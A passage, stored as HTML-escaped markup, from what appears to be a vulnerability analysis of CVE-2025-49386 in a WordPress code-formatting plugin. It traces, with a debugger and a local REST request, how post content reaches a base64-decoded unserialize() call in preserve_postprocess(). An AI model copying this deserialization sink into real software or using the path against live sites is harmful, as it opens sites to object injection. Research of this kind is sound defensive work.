class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$preserve&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;preserve_code_formatting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$preserve&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wrap_multiline_code_in_pre&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pre&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Set a breakpoint at the beginning of &lt;code&gt;preserve_postprocess()&lt;/code&gt; and create a new post:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;posts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_locale&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1763365761&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wordpress_test_cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;WP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;con&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;C1763781752&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;libraryContent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Dbrowse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1763608953&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;!--&amp;ensp;wp:paragraph&amp;ensp;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;!--&amp;ensp;/wp:paragraph&amp;ensp;--&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Test&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;status&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pending&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#34; title=&#34;Value of $content&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Value of $content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#39; alt=&#34;Content&#34; height=&#34;579&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $content&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$content&lt;/code&gt; matches the value supplied in the &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; field.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$codes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/(\{\!\{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[^\]]*\}\!\}.*\{\!\{\/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;\}\!\})/Us&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This regex locates the custom preserve tag blocks &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; and their matching closing tags. &lt;code&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/code&gt; ensures the matching blocks are preserved in the output array.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#34; title=&#34;Value of $tag&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/tag.png&#34; data-sub-html=&#34;&lt;h2&gt;Tag&lt;/h2&gt;&lt;p&gt;Value of $tag&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#39; alt=&#34;Tag&#34; height=&#34;509&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $tag&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$tag&lt;/code&gt; is &lt;code&gt;code&lt;/code&gt; or &lt;code&gt;pre&lt;/code&gt;, the preserve sections will be extracted; otherwise, the original content remains unchanged.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{(&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[^&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;]]*)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}(.*)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}/Us&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match()&lt;/code&gt; checks for a preserve block within &lt;code&gt;$code&lt;/code&gt;.&lt;br&gt;&#xA;&lt;code&gt;$match[1]&lt;/code&gt; → tag or attributes&lt;br&gt;&#xA;&lt;code&gt;$match[2]&lt;/code&gt; → block content&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#34; title=&#34;Value of $match&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/match.png&#34; data-sub-html=&#34;&lt;h2&gt;Match&lt;/h2&gt;&lt;p&gt;Value of $match&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#39; alt=&#34;Match&#34; height=&#34;615&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $match&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;chunk_split_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span 